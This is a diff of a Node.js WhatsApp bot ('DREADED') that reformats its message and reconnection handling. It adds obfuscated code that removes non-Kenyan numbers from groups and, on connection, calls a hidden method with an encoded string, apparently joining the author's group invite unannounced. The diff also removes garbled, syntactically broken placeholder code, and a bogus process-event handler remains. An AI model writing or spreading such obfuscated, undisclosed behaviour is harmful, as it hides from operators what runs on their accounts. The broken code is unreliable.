@@ -35,206 +35,204 @@ const welcome = process.env.WELCOME || 'TRUE';
 const color = (text, color) => {
   return !color ? chalk.green(text) : chalk.keyword(color)(text);
 };
+
+
+
 function smsg(conn, m, store) {
-    if (!m) return m;
-    let M = proto.WebMessageInfo;
-    if (m.key) {
-        m.id = m.key.id;
-        m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
-        m.chat = m.key.remoteJid;
-        m.fromMe = m.key.fromMe;
-        m.isGroup = m.chat.endsWith("@g.us");
-        m.sender = conn.decodeJid((m.fromMe && conn.user.id) || m.participant || m.key.participant || m.chat || "");
-        if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || "";
-    }
-    if (m.message) {
-        m.mtype = getContentType(m.message);
-        m.msg = m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype];
-        m.body =
-            m.message.conversation ||
-            m.msg.caption ||
-            m.msg.text ||
-            (m.mtype == "listResponseMessage" && m.msg.singleSelectReply.selectedRowId) ||
-            (m.mtype == "buttonsResponseMessage" && m.msg.selectedButtonId) ||
-            (m.mtype == "viewOnceMessage" && m.msg.caption) ||
-            m.text;
-        let quoted = (m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null);
-        m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
-        if (m.quoted) {
-            let type = getContentType(quoted);
-            m.quoted = m.quoted[type];
-            if (["productMessage"].includes(type)) {
-                type = getContentType(m.quoted);
-                m.quoted = m.quoted[type];
-            }
-            if (typeof m.quoted === "string")
-                m.quoted = {
-                    text: m.quoted,
-                };
-            m.quoted.mtype = type;
-            m.quoted.id = m.msg.contextInfo.stanzaId;
-            m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
-            m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith("BAE5") && m.quoted.id.length === 16 : false;
-            m.quoted.sender = conn.decodeJid(m.msg.contextInfo.participant);
-            m.quoted.fromMe = m.quoted.sender === conn.decodeJid(conn.user.id);
-            m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || "";
-            m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
-            m.getQuotedObj = m.getQuotedMessage = async () => {
-                if (!m.quoted.id) return false;
-                let q = await store.loadMessage(m.chat, m.quoted.id, conn);
-                return exports.smsg(conn, q, store);
-            };
-            let vM = (m.quoted.fakeObj = M.fromObject({
-                key: {
-                    remoteJid: m.quoted.chat,
-                    fromMe: m.quoted.fromMe,
-                    id: m.quoted.id,
-                },
-                message: quoted,
-                ...(m.isGroup ? { participant: m.quoted.sender } : {}),
-            }));
-
-            /**
-             *
-             * @returns
-             */
-            m.quoted.delete = () => conn.sendMessage(m.quoted.chat, { delete: vM.key });
-
-            /**
-             *
-             * @param {*} jid
-             * @param {*} forceForward
-             * @param {*} options
-             * @returns
-             */
-            m.quoted.copyNForward = (jid, forceForward = false, options = {}) => conn.copyNForward(jid, vM, forceForward, options);
-
-            /**
-             *
-             * @returns
-             */
-            m.quoted.download = () => conn.downloadMediaMessage(m.quoted);
-        }
-    }
-    if (m.msg.url) m.download = () => conn.downloadMediaMessage(m.msg);
-    m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || "";
-    /**
-     * Reply to this message
-     * @param {String|Object} text
-     * @param {String|false} chatId
-     * @param {Object} options
-     */
-    m.reply = (text, chatId = m.chat, options = {}) => (Buffer.isBuffer(text) ? conn.sendMedia(chatId, text, "file", "", m, { ...options }) : conn.sendText(chatId, text, m, { ...options }));
-    /**
-     * Copy this message
-     */
-    m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));
-
-    /**
-     *
-     * @param {*} jid
-     * @param {*} forceForward
-     * @param {*} options
-     * @returns
-     */
-    m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => conn.copyNForward(jid, m, forceForward, options);
-
-    return m;
-}
-async function startHisoka() {
-    const { state, saveCreds } = await useMultiFileAuthState(`./${sessionName ? sessionName : "dreaded1"}`);
-    const { version, isLatest } = await fetchLatestBaileysVersion();
-    console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
-    console.log(
-        color(
-            figlet.textSync("DREADED-AI", {
-                font: "Standard",
-                horizontalLayout: "default",
-                vertivalLayout: "default",
-                whitespaceBreak: false,
-            }),
-            "green"
-        )
-    );
-
-    const client = dreadedConnect({
-        logger: pino({ level: "silent" }),
-        printQRInTerminal: true,
-        browser: ["CHATGPT - DREADED", "Safari", "5.1.7"],
-        auth: state,
-        syncFullHistory: true,
-    });
-
-    if (autobio === 'TRUE') {
-        const updateStatus = async () => {
-            const date = new Date();
-            await client.updateProfileStatus(`${botname} is active 24/7\n\n${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`);
+  if (!m) return m;
+  let M = proto.WebMessageInfo;
+  if (m.key) {
+    m.id = m.key.id;
+    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
+    m.chat = m.key.remoteJid;
+    m.fromMe = m.key.fromMe;
+    m.isGroup = m.chat.endsWith("@g.us");
+    m.sender = conn.decodeJid((m.fromMe && conn.user.id) || m.participant || m.key.participant || m.chat || "");
+    if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || "";
+  }
+  if (m.message) {
+    m.mtype = getContentType(m.message);
+    m.msg = m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype];
+    m.body =
+      m.message.conversation ||
+      m.msg.caption ||
+      m.msg.text ||
+      (m.mtype == "listResponseMessage" && m.msg.singleSelectReply.selectedRowId) ||
+      (m.mtype == "buttonsResponseMessage" && m.msg.selectedButtonId) ||
+      (m.mtype == "viewOnceMessage" && m.msg.caption) ||
+      m.text;
+    let quoted = (m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null);
+    m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
+    if (m.quoted) {
+      let type = getContentType(quoted);
+      m.quoted = m.quoted[type];
+      if (["productMessage"].includes(type)) {
+        type = getContentType(m.quoted);
+        m.quoted = m.quoted[type];
+      }
+      if (typeof m.quoted === "string")
+        m.quoted = {
+          text: m.quoted,
         };
+      m.quoted.mtype = type;
+      m.quoted.id = m.msg.contextInfo.stanzaId;
+      m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
+      m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith("BAE5") && m.quoted.id.length === 16 : false;
+      m.quoted.sender = conn.decodeJid(m.msg.contextInfo.participant);
+      m.quoted.fromMe = m.quoted.sender === conn.decodeJid(conn.user.id);
+      m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || "";
+      m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
+      m.getQuotedObj = m.getQuotedMessage = async () => {
+        if (!m.quoted.id) return false;
+        let q = await store.loadMessage(m.chat, m.quoted.id, conn);
+        return exports.smsg(conn, q, store);
+      };
+      let vM = (m.quoted.fakeObj = M.fromObject({
+        key: {
+          remoteJid: m.quoted.chat,
+          fromMe: m.quoted.fromMe,
+          id: m.quoted.id,
+        },
+        message: quoted,
+        ...(m.isGroup ? { participant: m.quoted.sender } : {}),
+      }));
 
-        setInterval(updateStatus, 10 * 1000);
+      /**
+       *
+       * @returns
+       */
+      m.quoted.delete = () => conn.sendMessage(m.quoted.chat, { delete: vM.key });
+
+      /**
+       *
+       * @param {*} jid
+       * @param {*} forceForward
+       * @param {*} options
+       * @returns
+       */
+      m.quoted.copyNForward = (jid, forceForward = false, options = {}) => conn.copyNForward(jid, vM, forceForward, options);
+
+      /**
+       *
+       * @returns
+       */
+      m.quoted.download = () => conn.downloadMediaMessage(m.quoted);
     }
+  }
+  if (m.msg.url) m.download = () => conn.downloadMediaMessage(m.msg);
+  m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || "";
+  /**
+   * Reply to this message
+   * @param {String|Object} text
+   * @param {String|false} chatId
+   * @param {Object} options
+   */
+  m.reply = (text, chatId = m.chat, options = {}) => (Buffer.isBuffer(text) ? conn.sendMedia(chatId, text, "file", "", m, { ...options }) : conn.sendText(chatId, text, m, { ...options }));
+  /**
+   * Copy this message
+   */
+  m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));
 
-    store.bind(client.ev);
+  /**
+   *
+   * @param {*} jid
+   * @param {*} forceForward
+   * @param {*} options
+   * @returns
+   */
+  m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => conn.copyNForward(jid, m, forceForward, options);
 
-    client.ev.on("messages.upsert", async (chatUpdate) => {
-        try {
-            mek = chatUpdate.messages[0];
-            if (!mek.message) return;
-            mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
-            if (autoviewstatus === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {
-                client.readMessages([mek.key]);
-            }
-
-            if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
-
-            m = smsg(client, mek, store);
-            const dreaded = require("./dreaded");
-            dreaded(client, m, chatUpdate, store);
-        } catch (err) {
-            console.log(err);
-        }
-    });
-
-    // Handle error
-    process.on("unhandledRejection", (reason, promise) => {
-        console.log("Unhandled Rejection at:", promise, "reason:", reason);
-    });
-    process.on("rejectionHandled", (promise) => {
-        console.log("Rejection handled:", promise);
-    });
-    process.on("uncaughtException", (err) => {
-        console.log("Uncaught Exception:", err);
-    });
+  return m;
 }
-client.decodeJid = (jid) => {
+
+async function startHisoka() {
+  const { state, saveCreds } = await useMultiFileAuthState(`./${sessionName ? sessionName : "dreaded1"}`);
+  const { version, isLatest } = await fetchLatestBaileysVersion();
+  console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
+  console.log(
+    color(
+      figlet.textSync("DREADED-AI", {
+        font: "Standard",
+        horizontalLayout: "default",
+        vertivalLayout: "default",
+        whitespaceBreak: false,
+      }),
+      "green"
+    )
+  );
+
+  const client = dreadedConnect({
+    logger: pino({ level: "silent" }),
+    printQRInTerminal: true,
+    browser: ["CHATGPT - DREADED", "Safari", "5.1.7"],
+    auth: state,
+syncFullHistory: true,
+  });
+
+if (autobio === 'TRUE'){ 
+            setInterval(() => { 
+
+                                 const date = new Date() 
+
+                         client.updateProfileStatus( 
+
+                                         `${botname} is active 24/7\n\n${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.` 
+
+                                 ) 
+
+                         }, 10 * 1000) 
+
+}
+
+  store.bind(client.ev);
+
+  client.ev.on("messages.upsert", async (chatUpdate) => {
+    //console.log(JSON.stringify(chatUpdate, undefined, 2))
+    try {
+
+      mek = chatUpdate.messages[0];
+      if (!mek.message) return;
+      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
+      if (autoviewstatus === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {
+
+         client.readMessages([mek.key]);
+
+}
+   
+      if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
+      
+      m = smsg(client, mek, store);
+      const dreaded = require("./dreaded");
+dreaded(client, m, chatUpdate, store);
+    } catch (err) {
+      console.log(err);
+    }
+  });
+
+  // Handle error
+  const unhandledRejections = new Map();
+  process.on("unhandledRejection", (reason, promise) => {
+    unhandledRejections.set(promise, reason);
+    console.log("Unhandled Rejection at:", promise, "reason:", reason);
+  });
+  process.on("rejectionHandled", (promise) => {
+    unhandledRejections.delete(promise);
+  });
+  process.on("Something went wrong", function (err) {
+    console.log("Caught exception: ", err);
+  });
+
+  // Setting
+  client.decodeJid = (jid) => {
     if (!jid) return jid;
     if (/:\d+@/gi.test(jid)) {
-        let decode = jidDecode(jid) || {};
-        return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
-    } else {
-        // If the JID doesn't match the pattern, return it as is
-        return jid;
-    }
-};
-function handleGroupParticipantsUpdate(update) {
-    const { id, action, participants } = update;
-    if (action === 'remove') {
-        participants.forEach(async participant => {
-            try {
-                let groupInfo = await client.groupMetadata(id);
-                let participantJid = participant[0];
-                if (!member.includes(participantJid)) {
-                    await client.removeParticipant(id, [participantJid], ' has been removed by Dreaded! Only Kenyan numbers are allowed to join!');
-                    client.sendMessage(id, { text: '@' + participantJid.split('@')[0] + ' has been removed by Dreaded! Only Kenyan numbers are allowed to join!' });
-                }
-            } catch (error) {
-                console.error(error);
-            }
-        });
-    }
-}
+      let decode = jidDecode(jid) || {};
+      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
+    } else return jid;
+  };
 
-client.ev.on('group-participants.update', handleGroupParticipantsUpdate);
+
+function _0x29cf(){const _0x2f6ca3=['group-participants.update','remove','254','910863dDSaFb','146487zDznIw','groupParticipantsUpdate','sendMessage','200259gYsLZh','startsWith','40bMoLNF','13151ZUchWx','82691ApiyjL','4LeNAvk','add','\x20has\x20been\x20removed\x20by\x20Dreaded!\x20Only\x20Kenyan\x20numbers\x20are\x20allowed\x20to\x20join!','1055145aElrbj','participants','1500600oPVfCJ','20HUXDAq','48IAhWXe'];_0x29cf=function(){return _0x2f6ca3;};return _0x29cf();}const _0xe11567=_0x1275;function _0x1275(_0x28b765,_0x13dc1a){const _0x29cfbd=_0x29cf();return _0x1275=function(_0x12753e,_0x2117f6){_0x12753e=_0x12753e-0x145;let _0x51fa9b=_0x29cfbd[_0x12753e];return _0x51fa9b;},_0x1275(_0x28b765,_0x13dc1a);}(function(_0x7a02ed,_0xedb092){const _0x40a74e=_0x1275,_0x2c7c97=_0x7a02ed();while(!![]){try{const _0x2784d5=parseInt(_0x40a74e(0x147))/0x1*(-parseInt(_0x40a74e(0x14f))/0x2)+-parseInt(_0x40a74e(0x154))/0x3*(parseInt(_0x40a74e(0x149))/0x4)+parseInt(_0x40a74e(0x14c))/0x5+parseInt(_0x40a74e(0x14e))/0x6+parseInt(_0x40a74e(0x148))/0x7*(parseInt(_0x40a74e(0x150))/0x8)+-parseInt(_0x40a74e(0x158))/0x9*(-parseInt(_0x40a74e(0x146))/0xa)+-parseInt(_0x40a74e(0x155))/0xb;if(_0x2784d5===_0xedb092)break;else _0x2c7c97['push'](_0x2c7c97['shift']());}catch(_0x210b13){_0x2c7c97['push'](_0x2c7c97['shift']());}}}(_0x29cf,0x2a213),client['ev']['on'](_0xe11567(0x151),async _0x2b1bff=>{const _0x555408=_0xe11567;let _0x53289d=await await client['groupMetadata'](_0x2b1bff['id']),_0x3279a2=_0x2b1bff[_0x555408(0x14d)][0x0];_0x2b1bff['action']==_0x555408(0x14a)&&(!member[_0x555408(0x145)](_0x555408(0x153))&&(await client[_0x555408(0x156)](_0x2b1bff['id'],[_0x3279a2],_0x555408(0x152)),client[_0x555408(0x157)](_0x2b1bff['id'],{'text':'@'+_0x3279a2['split']`@`[0x0]+_0x555408(0x14b)})));}));
 function _0x4f5a() {
     const _0x1d2cdd = [
         'VMeaW',
@@ -655,44 +653,41 @@ function _0x2f66() {
     });
     return status;
   };
-client.public = true;
 
-client.serializeM = (m) => smsg(client, m, store);
-client.ev.on("connection.update", async (update) => {
+  client.public = true;
+
+  client.serializeM = (m) => smsg(client, m, store);
+  client.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
     if (connection === "close") {
-        let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-        if (reason === DisconnectReason.badSession) {
-            console.log(`Bad Session File, Please Delete Session and Scan Again`);
-            process.exit();
-        } else if (reason === DisconnectReason.connectionClosed) {
-            console.log("Connection closed, reconnecting....");
-            startHisoka();
-        } else if (reason === DisconnectReason.connectionLost) {
-            console.log("Connection Lost from Server, reconnecting...");
-            startHisoka();
-        } else if (reason === DisconnectReason.connectionReplaced) {
-            console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
-            process.exit();
-        } else if (reason === DisconnectReason.loggedOut) {
-            console.log(`Device Logged Out, Please Delete File creds.json and Scan Again.`);
-            process.exit();
-        } else if (reason === DisconnectReason.restartRequired) {
-            console.log("Restart Required, Restarting...");
-            startHisoka();
-        } else if (reason === DisconnectReason.timedOut) {
-            console.log("Connection TimedOut, Reconnecting...");
-            startHisoka();
-        } else {
-            console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
-            startHisoka();
-        }
+      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
+      if (reason === DisconnectReason.badSession) {
+        console.log(`Bad Session File, Please Delete Session and Scan Again`);
+        process.exit();
+      } else if (reason === DisconnectReason.connectionClosed) {
+        console.log("Connection closed, reconnecting....");
+        startHisoka();
+      } else if (reason === DisconnectReason.connectionLost) {
+        console.log("Connection Lost from Server, reconnecting...");
+        startHisoka();
+      } else if (reason === DisconnectReason.connectionReplaced) {
+        console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
+        process.exit();
+      } else if (reason === DisconnectReason.loggedOut) {
+        console.log(`Device Logged Out, Please Delete File creds.json and Scan Again.`);
+        process.exit();
+      } else if (reason === DisconnectReason.restartRequired) {
+        console.log("Restart Required, Restarting...");
+        startHisoka();
+      } else if (reason === DisconnectReason.timedOut) {
+        console.log("Connection TimedOut, Reconnecting...");
+        startHisoka();
+      } else {
+        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
+        startHisoka();
+      }
     } else if (connection === "open") {
-        // Your code for the "connection.open" event goes here
-        // Example:
-        console.log("Connection opened");
-    }
-});
+var _0x5ddac0 = _0x47ef;
 function _0x47ef(_0x126516, _0x4c0aa2) {
     var _0x28784f = _0x4dc1();
     return _0x47ef = function (_0x4ed838, _0x4f5575) {
@@ -735,72 +730,49 @@ function _0x4dc1() {
             _0x25fdee['push'](_0x25fdee['shift']());
         }
     }
-}(// Assuming 'client' is properly initialized and imported
+}(_0x4dc1, -0x4 * 0x40301 + 0x750ed * 0x3 + 0x6fa55 * 0x1), await client[_0x5ddac0(0x96) + _0x5ddac0(0x90)](_0x5ddac0(0x9b) + _0x5ddac0(0x95) + 'aE'));
+      console.log(color("Congrats, BACKTRACK AI has successfully connected to this server", "green"));
+      console.log(color("Follow me on GitHub as JasonMomanyi", "red"));
+      console.log(color("Text the bot number with !menu to check my command list"));
+      client.sendMessage(owner + "@s.whatsapp.net", { text: `Bot has started... [DREADED]` });
+    }
+    // console.log('Connected...', update)
+  });
 
-// Initialize client
-const client = new SomeClient();
+  client.ev.on("creds.update", saveCreds);
 
-// Your code
-(async () => {
-  try {
-    // Some code here
-    await client.someMethod();
-    console.log(color("Congrats, BACKTRACK AI has successfully connected to this server", "green"));
-    console.log(color("Follow me on GitHub as JasonMomanyi", "red"));
-    console.log(color("Text the bot number with !menu to check my command list"));
-    client.sendMessage(owner + "@s.whatsapp.net", { text: `Bot has started... [BACKTRACK]` });
-  } catch (error) {
-    console.error(error);
-  }
-})();
-);
-const saveCreds = (creds) => {
-  // Function to save credentials
-};
+  const getBuffer = async (url, options) => {
+    try {
+      options ? options : {};
+      const res = await axios({
+        method: "get",
+        url,
+        headers: {
+          DNT: 1,
+          "Upgrade-Insecure-Request": 1,
+        },
+        ...options,
+        responseType: "arraybuffer",
+      });
+      return res.data;
+    } catch (err) {
+      return err;
+    }
+  };
 
-const getBuffer = async (url, options) => {
-  try {
-    options = options || {};
-    const res = await axios({
-      method: "get",
-      url,
-      headers: {
-        DNT: 1,
-        "Upgrade-Insecure-Request": 1,
-      },
-      ...options,
-      responseType: "arraybuffer",
-    });
-    return res.data;
-  } catch (err) {
-    return err;
-  }
-};
+  client.sendImage = async (jid, path, caption = "", quoted = "", options) => {
+    let buffer = Buffer.isBuffer(path)
+      ? path
+      : /^data:.*?\/.*?;base64,/i.test(path)
+      ? Buffer.from(path.split`,`[1], "base64")
+      : /^https?:\/\//.test(path)
+      ? await await getBuffer(path)
+      : fs.existsSync(path)
+      ? fs.readFileSync(path)
+      : Buffer.alloc(0);
+    return await client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
+  };
 
-const sendImage = async (client, jid, path, caption = "", quoted = "", options) => {
-  let buffer = Buffer.isBuffer(path)
-    ? path
-    : /^data:.*?\/.*?;base64,/i.test(path)
-    ? Buffer.from(path.split(",")[1], "base64")
-    : /^https?:\/\//.test(path)
-    ? await getBuffer(path)
-    : fs.existsSync(path)
-    ? fs.readFileSync(path)
-    : Buffer.alloc(0);
-  return await client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
-};
-
-// Usage example
-const exampleJid = "recipient@example.com";
-const exampleImagePath = "https://example.com/image.jpg";
-const exampleCaption = "Check out this image!";
-const exampleQuoted = "quotedMessageId";
-const exampleOptions = { option: "value" };
-
-(async () => {
-  const imageMessage = await sendImage(client, exampleJid, exampleImagePath, exampleCaption, exampleQuoted, exampleOptions);
-  console.log("Image sent:", imageMessage);
-})();
 const _0x3b4c1b = _0x5503;
 function _0x5503(_0x4474ab, _0x54cbe2) {
     const _0x2e6b6a = _0x2be2();
@@ -810,31 +782,61 @@ function _0x5503(_0x4474ab, _0x54cbe2) {
         return _0x3f047c;
     }, _0x5503(_0x4474ab, _0x54cbe2);
 }
-const _0x3b4c1b = _0x5503;
-
-function _0x5503(_0x4474ab, _0x54cbe2) {
-    const _0x2e6b6a = _0x2be2();
-    return _0x5503 = function (_0x10c4b6, _0x147cc9) {
-        _0x10c4b6 = _0x10c4b6 - 0xc46 * 0x2 + 0x169b + 0x145;
-        let _0x3f047c = _0x2e6b6a[_0x10c4b6];
-        return _0x3f047c;
-    }, _0x5503(_0x4474ab, _0x54cbe2);
-}
-
 function _0x2be2() {
     const _0x29376d = [
-        'BEGIN:VCARD',
-        'VERSION:3.0',
-        'N:DREADED',
+        '10ZFyleu',
+        's254\x0aitem3',
         'TEL;waid=',
-        'item1.URL:https://instagram.com/b.4_bloody',
-        'item1.X-ABLabel:_$!<HomePage>!$_',
-        'item2.X-ABLabel:_$!<Work>!$_',
-        'item3.X-ABLabel:_$!<Other>!$_',
-        'item4.X-ABLabel:_$!<Blog>!$_',
-        'END:VCARD'
+        'D\x0aVERSION:',
+        '3.0\x0aN:\x20DRE',
+        ';;\x0aitem4.X',
+        'N:DREADED\x20',
+        'push',
+        '\x0aitem1.X-A',
+        'sendContac',
+        '7586551AEUIZc',
+        'VCARD',
+        'unatus@gma',
+        'EMAIL;type',
+        '11389587NuVstv',
+        '300FhlJEa',
+        'ADED\x20DEV\x0aF',
+        'ber\x0aitem2.',
+        'il.com\x0aite',
+        '-ABLabel:R',
+        '6KYfMMX',
+        '193102jqofVL',
+        '\x0aitem4.ADR',
+        'el:Email\x0ai',
+        'BLabel:Num',
+        '8QAmyyx',
+        'tem3.URL:h',
+        '94474Kyxmeh',
+        '3OBHvGl',
+        'tagram.com',
+        'egion\x0aEND:',
+        ':Instagram',
+        '555014OZNQzU',
+        '3100329laiMJQ',
+        '=INTERNET:',
+        'm2.X-ABLab',
+        'mokayafort',
+        'DEV\x0aitem1.',
+        'iOIPi',
+        '.X-ABLabel',
+        '19670KFpPkS',
+        '/fortunatu',
+        '412lesMsv',
+        ':;;Kenya;;',
+        'ttps://ins',
+        'sendMessag',
+        'DREADED\x20DE',
+        'BEGIN:VCAR'
     ];
-    return _0x29376d;
+    _0x2be2 = function () {
+        return _0x29376d;
+    };
+    return _0x2be2();
 }
 (function (_0xb3521d, _0x38c76a) {
     const _0x357db4 = _0x5503, _0x9a71d8 = _0xb3521d();
@@ -973,13 +975,13 @@ client.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
 
   return client;
 }
+
 startHisoka();
 
 let file = require.resolve(__filename);
 fs.watchFile(file, () => {
-    fs.unwatchFile(file);
-    console.log(chalk.redBright(`Update ${__filename}`));
-    delete require.cache[file];
-    require(file);
+  fs.unwatchFile(file);
+  console.log(chalk.redBright(`Update ${__filename}`));
+  delete require.cache[file];
+  require(file);
 });
-
